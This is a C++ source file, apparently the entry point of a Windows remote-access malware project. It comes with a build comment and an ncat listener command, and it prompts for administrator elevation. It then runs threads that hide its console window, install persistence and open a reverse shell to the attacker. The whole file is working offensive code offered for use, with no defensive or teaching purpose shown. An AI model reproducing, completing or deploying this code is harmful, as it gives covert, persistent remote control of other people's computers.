// g++ main.cpp -o reverse.exe -std=c++17 -mwindows -lole32 -luuid -lntdll -lwinmm -lgdi32 -D__DEBUG__
// ncat -nlvp 443
#include <Windows.h>
#include <thread>
#include "reverseshell.cpp"
#include "persistent.cpp"
#include "cmd.cpp"
bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(administratorsGroup);
    }
    return isAdmin == TRUE;
}
int main() {
    if (!IsRunAsAdmin()) {
        WCHAR path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        ShellExecuteW(NULL, L"runas", path, NULL, NULL, SW_SHOWNORMAL);
        return 0;
    }
    std::thread t1(hideConsoleWindow);
    std::thread t2(persistent);
    std::thread t3(reverseshell);
    t1.join();
    t2.join();
    t3.join();
    return 0;
}
